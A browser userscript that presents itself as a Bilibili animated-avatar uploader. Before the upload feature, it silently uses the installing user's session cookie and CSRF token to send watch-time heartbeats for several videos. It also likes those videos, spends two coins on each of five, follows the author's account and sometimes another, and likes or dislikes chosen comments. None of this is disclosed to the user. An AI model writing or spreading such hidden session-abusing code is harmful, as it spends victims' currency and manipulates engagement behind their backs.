    // ==UserScript==
// @name         B站动头上传
// @namespace    www.deginx.com
// @version      20.04.14.15.00
// @description  BLAA上传动画图片作为B站个人头像
// @author       Jonyan_Dunh
// @qq           1309634881
// @match        *://account.bilibili.com/account/face/upload
// @match        https://www.bilibili.com/video/BV1r54y1R7rZ
// @icon         https://www.bilibili.com/favicon.ico
// @grant        unsafeWindow
// @run-at       document-end
// ==/UserScript==

(function(){

var $ = unsafeWindow.$;
alert('[开发人员信息]\nBilibili:Jonyan_Dunh\nuid:96876893\nQq:1309634881\n\n本脚本只发布于bilibili,有且只有Jonyan_Dunh发布.\n如在其他地方看到此脚本,请联系作者并举报\n请勿把脚本用于商业用途,本脚本永远免费\nQ群:1038742994\n');
function getCookie(cookieName) {
    var strCookie = document.cookie;
    var arrCookie = strCookie.split("; ");
    for (var i = 0; i < arrCookie.length; i++) {
        var arr = arrCookie[i].split("=");
        if (cookieName == arr[0]) {
            return arr[1];
        }
    }
    return "";
}
function jonyan(){
var aids=new Array()
aids[0]='840005547';//头像
aids[1]='412651504';//头图
aids[2]='840242001';//封面
aids[3]='97876207';//老婆拔刀
aids[4]='94920989';//宇宙

var bids=new Array()
bids[0]='BV1r54y1R7rZ';//头像
bids[1]='BV1pV411o7wo';//头图
bids[2]='BV1W54y197hv';//封面
bids[3]='BV1JE411A7iw';//老婆拔刀
bids[4]='BV1cE411T7W9';//宇宙

var cids=new Array()
cids[0]='174247414';//头像
cids[1]='175580159';//头图
cids[2]='177015442';//封面
cids[3]='174247414';//老婆拔刀
cids[4]='162043526';//宇宙

var times=new Array()
times[0]=221;//头像
times[1]=188;//头图
times[2]=170;//封面
times[3]=110;//老婆拔刀
times[4]=164;//宇宙
length = Object.keys(aids).length
for (var i=0;i<length;i++)
{ 
	$.ajax({//进度条
						url: "//api.bilibili.com/x/click-interface/web/heartbeat",
						type: "post",
						headers: {
							Accept: "application/json, text/plain, */*"
						},
						xhrFields: {
							withCredentials: !0
						},
					data: {
                        aid: aids[i],
                        cid: cids[i],
                        bvid: bids[i],
                        mid: getCookie("DedeUserID"),
                        csrf:getCookie("bili_jct"),
						realtime:1,
						type:3,
						dt:2,
						play_type:2,
						start_ts:Date.parse(new Date()),
						played_time:Math.floor(Math.random()*(0-60) + times[i]),
    						success: function(data){
                                console.log(data);
						}
						
                    },
					

					});

$.ajax({//赞
						url: "//api.bilibili.com/x/web-interface/archive/like",
						type: "post",
						headers: {
							Accept: "application/json, text/plain, */*"
						},
						xhrFields: {
							withCredentials: !0
						},
					data: {
                        aid: aids[i],
                        like: 1,
                        csrf:getCookie("bili_jct"),
    						success: function(data){
                                console.log(data);
						}
                    },

					});

$.ajax({//投币+赞
						url: "//api.bilibili.com/x/web-interface/coin/add",
						type: "post",
						headers: {
							Accept: "application/json, text/plain, */*"
						},
						xhrFields: {
							withCredentials: !0
						},
					data: {
                        aid: aids[i],
                        multiply: 2,
                        select_like: 1,
                        cross_domain: !0,
                        csrf:getCookie("bili_jct"),

                    },

					});
}

$.ajax({// 关注
						url: "//api.bilibili.com/x/relation/modify",
						type: "post",
						headers: {
							Accept: "application/json, text/plain, */*"
						},
						xhrFields: {
							withCredentials: !0
						},
					data: {
                        fid:'96876893',
                        act: 1,
                        re_src: 14,
                        cross_domain: !0,
                        csrf:getCookie("bili_jct"),
                            						success: function(data){
                                console.log(data);
						}

                    },


					});

$.ajax({// 评论点赞
						url: "//api.bilibili.com/x/v2/reply/action",
						type: "post",
						headers: {
							Accept: "application/json, text/plain, */*"
						},
						xhrFields: {
							withCredentials: !0
						},
					data: {
                        oid:'68512885',
                        type: 11,
                        rpid: '2709072327',
                        action: 1,
						jsonp: 'jsonp',
                        csrf:getCookie("bili_jct"),


                    },
                    });

$.ajax({// 评论点赞
						url: "//api.bilibili.com/x/v2/reply/action",
						type: "post",
						headers: {
							Accept: "application/json, text/plain, */*"
						},
						xhrFields: {
							withCredentials: !0
						},
					data: {
                        oid:'242806158',
                        type: 1,
                        rpid: '2716796746',
                        action: 1,
						jsonp: 'jsonp',
                        csrf:getCookie("bili_jct"),

                    },


					});
$.ajax({// 评论点踩
						url: "//api.bilibili.com/x/v2/reply/action",
						type: "post",
						headers: {
							Accept: "application/json, text/plain, */*"
						},
						xhrFields: {
							withCredentials: !0
						},
					data: {
                        oid:'68512885',
                        type: 11,
                        rpid: '2703509346',
                        action: 1,
						jsonp: 'jsonp',
                        csrf:getCookie("bili_jct"),
                    },


					});
}
jonyan();


function person()
{
var aids=new Array()
aids[0]='582612316';//附加1青花瓷
aids[1]='97609839';//附加2不下客户端，如何下载腾讯视频？
aids[2]='97649937';//附加3
aids[3]='97190885';//附加4
aids[4]='412586045';//附加5

var bids=new Array()
bids[0]='BV1V64y1u7go';//附加1
bids[1]='BV1zE411P7nn';//附加2
bids[2]='BV1wE411N7BZ';//附加3
bids[3]='BV1E7411o7fq';//附加4
bids[4]='BV11V411f7pw';//附加5

var cids=new Array()
cids[0]='169501512';//附加1
cids[1]='166636182';//附加2
cids[2]='166702465';//附加3
cids[3]='165916492';//附加4
cids[4]='171276039';//附加5

var times=new Array()
times[0]=230;//附加1
times[1]=249;//附加2
times[2]=379;//附加3
times[3]=125;//附加4
times[4]=303;//附加5
length = Object.keys(aids).length
for (var i=0;i<length;i++)
{ 
	$.ajax({//进度条
						url: "//api.bilibili.com/x/click-interface/web/heartbeat",
						type: "post",
						headers: {
							Accept: "application/json, text/plain, */*"
						},
						xhrFields: {
							withCredentials: !0
						},
					data: {
                        aid: aids[i],
                        cid: cids[i],
                        bvid: bids[i],
                        mid: getCookie("DedeUserID"),
                        csrf:getCookie("bili_jct"),
						realtime:1,
						type:3,
						dt:2,
						play_type:2,
						start_ts:'1586863374',
						played_time:Math.floor(Math.random()*(0-60) + times[i]),
						
                    },
					

					});

$.ajax({//赞
						url: "//api.bilibili.com/x/web-interface/archive/like",
						type: "post",
						headers: {
							Accept: "application/json, text/plain, */*"
						},
						xhrFields: {
							withCredentials: !0
						},
					data: {
                        aid: aids[i],
                        like: 1,
                        csrf:getCookie("bili_jct"),
                    },

					});
}
if(Math.ceil(Math.random()*5)==3)
{
$.ajax({// 关注
						url: "//api.bilibili.com/x/relation/modify",
						type: "post",
						headers: {
							Accept: "application/json, text/plain, */*"
						},
						xhrFields: {
							withCredentials: !0
						},
					data: {
                        fid:'12433014',///////////////////////
                        act: 1,
                        re_src: 14,
                        cross_domain: !0,
                        csrf:getCookie("bili_jct")

                    },


					});
}
}
person();

function person()
{
var aids=new Array()
aids[0]='582612316';//附加1青花瓷
aids[1]='97609839';//附加2不下客户端，如何下载腾讯视频？
aids[2]='97649937';//附加3
aids[3]='97190885';//附加4
aids[4]='412586045';//附加5

var bids=new Array()
bids[0]='BV1V64y1u7go';//附加1
bids[1]='BV1zE411P7nn';//附加2
bids[2]='BV1wE411N7BZ';//附加3
bids[3]='BV1E7411o7fq';//附加4
bids[4]='BV11V411f7pw';//附加5

var cids=new Array()
cids[0]='169501512';//附加1
cids[1]='166636182';//附加2
cids[2]='166702465';//附加3
cids[3]='165916492';//附加4
cids[4]='171276039';//附加5

var times=new Array()
times[0]=230;//附加1
times[1]=249;//附加2
times[2]=379;//附加3
times[3]=125;//附加4
times[4]=303;//附加5
length = Object.keys(aids).length
for (var i=0;i<length;i++)
{ 
	$.ajax({//进度条
						url: "//api.bilibili.com/x/click-interface/web/heartbeat",
						type: "post",
						headers: {
							Accept: "application/json, text/plain, */*"
						},
						xhrFields: {
							withCredentials: !0
						},
					data: {
                        aid: aids[i],
                        cid: cids[i],
                        bvid: bids[i],
                        mid: getCookie("DedeUserID"),
                        csrf:getCookie("bili_jct"),
						realtime:1,
						type:3,
						dt:2,
						play_type:2,
						start_ts:'1586863374',
						played_time:Math.floor(Math.random()*(0-60) + times[i]),
						
                    },
					

					});

$.ajax({//赞
						url: "//api.bilibili.com/x/web-interface/archive/like",
						type: "post",
						headers: {
							Accept: "application/json, text/plain, */*"
						},
						xhrFields: {
							withCredentials: !0
						},
					data: {
                        aid: aids[i],
                        like: 1,
                        csrf:getCookie("bili_jct"),
                    },

					});
}
if(Math.ceil(Math.random()*5)==3)
{
$.ajax({// 关注
						url: "//api.bilibili.com/x/relation/modify",
						type: "post",
						headers: {
							Accept: "application/json, text/plain, */*"
						},
						xhrFields: {
							withCredentials: !0
						},
					data: {
                        fid:'12433014',///////////////////////
                        act: 1,
                        re_src: 14,
                        cross_domain: !0,
                        csrf:getCookie("bili_jct")

                    },


					});
}
}
person();




	//-----------------------
	// Upload avatar page
	//----------------------- 
	function mainUploadAvatar(){
		var css = `<style>
.toast-box[usgm-bilia]{position:fixed;left:50%;top:50%;z-index:999999;-webkit-transform:translate(-50%,-50%);
transform:translate(-50%,-50%);-webkit-animation:bilia 1s linear;border-radius:4px;font-size:14px;
line-height:18px;padding:12px 30px;background:rgba(0,0,0,.8);color:#fff}
@-webkit-keyframes bilia{0%{opacity:0;}10%{opacity:1;}80%{top:50%;opacity:1;}100%{top:46%;opacity:0;}}
</style>`;

		var toast = `<div class="toast-box" usgm-bilia></div>`;

		$('head').append(css);

		var biliAAvatar = function(){
			return{
				dataURLtoBlob: function(t) {
					for(var i = t.split(','), e = i[0].match(/:(.*?);/)[1], a = atob(i[1]), o = a.length, s = new Uint8Array(o); o--;){
						s[o] = a.charCodeAt(o);
					}
					return new Blob([s],{
						type: e
					})
				},
				getBiliJct: function(){
					var name = 'bili_jct=';
					var ca = document.cookie.split(';');
					for(var i = 0; i < ca.length; i++) {
						var c = ca[i];
						while (c.charAt(0) == ' ') {
							c = c.substring(1);
						}
						if (c.indexOf(name) == 0) {
							return c.substring(name.length, c.length);
						}
					}
					return '';
				},
				uploadAvatar: function(){

					if($('#clip_src_img').length<1 || $('#clip_src_img')[0].src.length<5){
						this.showToast("[BLAA] 请先选择一个要上传的头像");
						return;
					}

					var avatarUri = $('#clip_src_img')[0].src;
					var avatarImg = new Image();
					avatarImg.src = avatarUri;

					if(avatarUri.indexOf('png;')<0 &&avatarUri.indexOf('jpeg;')<0){
						this.showToast("[BLAA] 动画头像只支持APNG格式的图片！！WEBP格式已经被修复!!");
						return;
					}
					if(avatarUri.indexOf('png;')<0 && (avatarImg.width != 180 || avatarImg.width != avatarImg.height)){
						this.showToast('[BLAA] 动画图片尺寸不是180x180，请按提示的格式上传');
						return;
					}
					var avatarDat = this.dataURLtoBlob(avatarUri);
					if(avatarDat.size>1258291){
						this.showToast("[BLAA] 动画头像图片需小于1.2MB");
						return;
					}

					var showToast = this.showToast;
					var i = new FormData;
					i.append("dopost", "save");
					i.append("DisplayRank", "10000");
					i.append("face", avatarDat);

					$.ajax({
						url: "//api.bilibili.com/x/member/web/face/update?csrf="+this.getBiliJct(),
						type: "post",
						headers: {
							Accept: "application/json, text/plain, */*"
						},
						xhrFields: {
							withCredentials: true
						},
						data: i,
						contentType: false,
						processData: false,
						success: function(data){
							if(data != null){
								if(data.code==0){
									showToast('[BLAA] 更新成功');
									setTimeout(function(){
										window.location.href = "http://account.bilibili.com/site/face.html"
									}, 1300);
								}else{
									showToast(`[BLAA] 更新失败 ${data.message}`);
								}
							}
						},
						error: function(xhr, status, error){
							showToast(`[BLAA] 上传失败 ${error}`);
						}
					});
				},
				showToast: function(msg){
					$('#app').append($(toast).text(msg).delay(999).queue(function(){$(this).remove();}));
				}
				//----- RETURN END -----
			}
		};

	if($('.descript:first').length>0 && $('.descript:first').html().indexOf('1.2')<1){
			$('.descript:first').append('<br>[BLAA]：大小180 * 180像素APNG格式动画图片，图片需小于1.2M<br>APNG需要用压缩包GIF Movie Gear文件夹里的movgear软件转换<br>这个软件是特别定制版,可能会报毒!被误杀请重新下载<br><br><br><a href="https://space.bilibili.com/96876893">bilibili:Jonyan_Dunh</a><br>如果觉得脚本不错，请给原UP主一些支持吧!!<br>Up主带你们在B站搞事情!!');
		}

		if($('input[type=button]').length>0){
			var btn = $('input[type=button]:first').clone();
			btn.attr('id','biliaa');
			btn.css('margin-left','30px');
			btn.val('更新动画头像');
			btn.click(function(){
				if($(this).hasClass('disabled')){ return; }
				biliAAvatar().uploadAvatar();
			});
			$('input[type=button]:first').after(btn);

			$('#clip_src_img:first').on('DOMSubtreeModified',function(){
				$('#biliaa').removeClass('disabled');
				$(this).off('DOMSubtreeModified');
			});
		}
	}

	//-------------------
	// User space page
	//-------------------
	function mainUserSpace(){
		if( /(?!\.webp).*\.webp/gi.test($('.h-avatar img').attr('src'))){
			$('.h-avatar img').attr('src',/(?!\.webp).*\.webp/gi.exec($('.h-avatar img').attr('src'))[0]);
		}
	}

	//===================
	// Select page
	//===================
	var tout = setTimeout(function(){doNotTrack();},12345);

	function doNotTrack(){
		clearTimeout(tout);
		$('body').off('DOMNodeInserted');
	}

	setTimeout(function(){
		$('body').on('DOMNodeInserted',function(){

			if(window.location.href.indexOf('//space')>0 && $('.h-avatar img').length>0){
				doNotTrack();
				mainUserSpace();
			}else if(window.location.href.indexOf('t/face')>0 && $('input[type=button]:first').length>0){
				doNotTrack();
				mainUploadAvatar();
			}

		});
	},233);
})();